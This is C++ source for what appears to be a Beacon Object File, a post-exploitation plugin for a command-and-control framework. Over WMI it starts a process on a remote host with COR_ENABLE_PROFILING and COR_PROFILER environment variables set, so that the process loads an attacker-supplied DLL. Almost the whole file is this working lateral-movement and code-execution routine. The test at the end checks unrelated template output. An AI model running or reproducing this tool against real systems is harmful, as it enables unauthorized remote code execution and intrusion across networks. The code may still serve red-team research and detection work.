#include <windows.h>
#include "base\helpers.h"
#include <WbemCli.h>
#include <oleauto.h>
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")


/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif


extern "C" {
#include "beacon.h"


    void go(char* args, int len) {
        
        DFR_LOCAL(OLE32, CoInitializeEx);
        DFR_LOCAL(OLE32, CoCreateInstance);
        DFR_LOCAL(OLE32, CoUninitialize);
        DFR_LOCAL(OLE32, CoSetProxyBlanket);
        DFR_LOCAL(OLEAUT32, SysAllocString);
        DFR_LOCAL(OLEAUT32, SysFreeString);
        DFR_LOCAL(OLEAUT32, VariantInit);
        DFR_LOCAL(OLEAUT32, SafeArrayPutElement);
        DFR_LOCAL(OLEAUT32, SafeArrayCreateVector);
        DFR_LOCAL(OLE32, CLSIDFromString);
        DFR_LOCAL(OLE32, IIDFromString);
        
        
        datap parser;
        wchar_t* command = NULL;
        wchar_t* dllpath = NULL;
        wchar_t* ip = NULL;
       

        BeaconDataParse(&parser, args, len);
        command = (wchar_t*)BeaconDataExtract(&parser, NULL);
        dllpath = (wchar_t*)BeaconDataExtract(&parser, NULL);
        ip = (wchar_t*)BeaconDataExtract(&parser, NULL);

        HRESULT hr;
        hr = CoInitializeEx(0, COINIT_APARTMENTTHREADED);
        if (hr != RPC_E_CHANGED_MODE) {
            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%08lx", hr);
                return;
            }
        }

        // IWbemClassObject Interface
        // https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/46710c5c-d7ab-4e4c-b4a5-ebff311fdcd1

        wchar_t* Iwbmstr = SysAllocString(L"{dc12a687-737f-11cf-884d-00aa004b2e24}");
        wchar_t* Cwbmstr = SysAllocString(L"{4590f811-1d3a-11d0-891f-00aa004b2e24}");

        CLSID clsid; // Unmarshaler CLSID, 4590F812-1D3A-11D0-891F-00AA004B2E24
        IID iid; // Interface UUID, DC12A681-737F-11CF-884D-00AA004B2E24

        CLSIDFromString(Cwbmstr, &clsid);
        IIDFromString(Iwbmstr, &iid);

        IWbemLocator* wbemLocator = NULL;

        hr = CoCreateInstance(clsid, NULL, 1, iid, (LPVOID*)&wbemLocator); // 1 == CLSCTX_INPROC_SERVER
        if (FAILED(hr)) {
            CoUninitialize();
            BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance Failed");
            return;
        }

        IWbemServices* wbemServices = NULL;
        // Insert argv[2] in the middle of the baseString
        BSTR bstrResult = SysAllocString(ip);

        hr = wbemLocator->ConnectServer(bstrResult, NULL, NULL, 0, NULL, 0, 0, &wbemServices);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "ConnectServer Failed\n");
            return;
        }

        hr = CoSetProxyBlanket(wbemServices,
            RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx 0xA
            RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx 0x0
            NULL,                        // Server principal name 0x0 
            RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 0x3
            RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx 0x3
            NULL,                        // client identity 0x0
            EOAC_NONE                    // proxy capabilities 0x0
        );

        if (FAILED(hr)) {
            wbemLocator->Release();
            BeaconPrintf(CALLBACK_ERROR, "CoSetProxyBlanket Failed\n");
            return;
        }

        // Win32_Process
        IWbemClassObject* oWin32Process = NULL;
        hr = wbemServices->GetObject((BSTR)L"Win32_Process", 0, NULL, &oWin32Process, NULL);
        if (FAILED(hr)) {
            wbemServices->Release();
            BeaconPrintf(CALLBACK_ERROR, "GetObject Win32_Process Failed\n");
            return;
        }

        // Win32_ProcessStartup
        IWbemClassObject* oWin32ProcessStartup = NULL;
        hr = wbemServices->GetObject((BSTR)L"Win32_ProcessStartup", 0, NULL, &oWin32ProcessStartup, NULL);
        if (FAILED(hr)) {
            oWin32ProcessStartup->Release();
            BeaconPrintf(CALLBACK_ERROR, "GetObject Win32_ProcessStartup Failed\n");
            return;
        }

        IWbemClassObject* pStartupInstance = NULL;
        hr = oWin32ProcessStartup->SpawnInstance(0, &pStartupInstance);
        if (FAILED(hr)) {
            oWin32ProcessStartup->Release();
            BeaconPrintf(CALLBACK_ERROR, "SpawnInstance pStartupInstance Failed\n");
            return;
        }

        VARIANT varParams;
        VariantInit(&varParams);
        varParams.vt = VT_I2;
        varParams.intVal = SW_SHOW;

        hr = pStartupInstance->Put((BSTR)L"ShowWindow", 0, &varParams, 0);
        if (FAILED(hr)) {
            oWin32ProcessStartup->Release();
            BeaconPrintf(CALLBACK_ERROR, "Put ShowWindow Variant Failed\n");
            return;
        }

        SAFEARRAY* pEnvVariables = SafeArrayCreateVector(VT_BSTR, 0, 3); // Adjust the size accordingly


        LONG index = 0;

        BSTR envVar0 = SysAllocString(L"COR_ENABLE_PROFILING=1");
        BSTR envVar1 = SysAllocString(L"COR_PROFILER={b45048d5-6f44-4fbe-ae88-b468a5e4927a}");
        BSTR envVar2 = SysAllocString(dllpath);

        SafeArrayPutElement(pEnvVariables, &index, envVar0);
        index += 1;
        SafeArrayPutElement(pEnvVariables, &index, envVar1);
        index += 1;
        SafeArrayPutElement(pEnvVariables, &index, envVar2);
        index += 1;

        VARIANT varEnv;
        VariantInit(&varEnv);
        varEnv.vt = VT_ARRAY | VT_BSTR;
        varEnv.parray = pEnvVariables;

        hr = pStartupInstance->Put((BSTR)L"EnvironmentVariables", 0, &varEnv, 0);
        if (FAILED(hr)) {
            oWin32ProcessStartup->Release();
            BeaconPrintf(CALLBACK_ERROR, "Put EnvironmentVariables Variant Failed\n");
            return;
        }

        // Create
        IWbemClassObject* pInParamsDefinition = NULL;
        hr = oWin32Process->GetMethod((BSTR)L"Create", 0, &pInParamsDefinition, NULL);
        if (FAILED(hr)) {
            oWin32Process->Release();
            BeaconPrintf(CALLBACK_ERROR, "GetMethod Create Failed\n");
            return;
        }

        IWbemClassObject* pParamsInstance = NULL;
        hr = pInParamsDefinition->SpawnInstance(0, &pParamsInstance);
        if (FAILED(hr)) {
            pInParamsDefinition->Release();
            BeaconPrintf(CALLBACK_ERROR, "SpawnInstance pParamsInstance Failed\n");
            return;
        }

        VARIANT varCommand;
        VariantInit(&varCommand);
        varCommand.vt = VT_BSTR;
        varCommand.bstrVal = SysAllocString(command);
        hr = pParamsInstance->Put((BSTR)L"CommandLine", 0, &varCommand, 0);
        if (FAILED(hr)) {
            pParamsInstance->Release();
            BeaconPrintf(CALLBACK_ERROR, "Put CommandLine Variant Failed\n");
            return;
        }

        VARIANT vtDispatch;
        VariantInit(&vtDispatch);
        vtDispatch.vt = VT_DISPATCH;
        vtDispatch.byref = pStartupInstance;


        hr = pParamsInstance->Put((BSTR)L"ProcessStartupInformation", 0, &vtDispatch, 0);
        if (FAILED(hr)) {
            pParamsInstance->Release();
            BeaconPrintf(CALLBACK_ERROR, "Put ProcessStartupInformation Variant Failed\n");
            return;
        }

        IWbemClassObject* pOutParams = NULL;
        hr = wbemServices->ExecMethod((BSTR)L"Win32_Process", (BSTR)L"Create", 0, NULL, pParamsInstance, &pOutParams, NULL);
        if (FAILED(hr)) {
            wbemServices->Release();
            BeaconPrintf(CALLBACK_ERROR, "ExecMethod Win32_Process Create Failed\n");
            return;
        }

        pParamsInstance->Release();
        oWin32Process->Release();
        oWin32ProcessStartup->Release();
        pStartupInstance->Release();
        wbemServices->Release();
        wbemLocator->Release();
        CoUninitialize();

        BeaconPrintf(CALLBACK_OUTPUT, "Success\n");
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<wchar_t*, wchar_t*>(go, L"notepad.exe", L"\\\\127.0.0.1\\ROOT\\CIMV2");
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif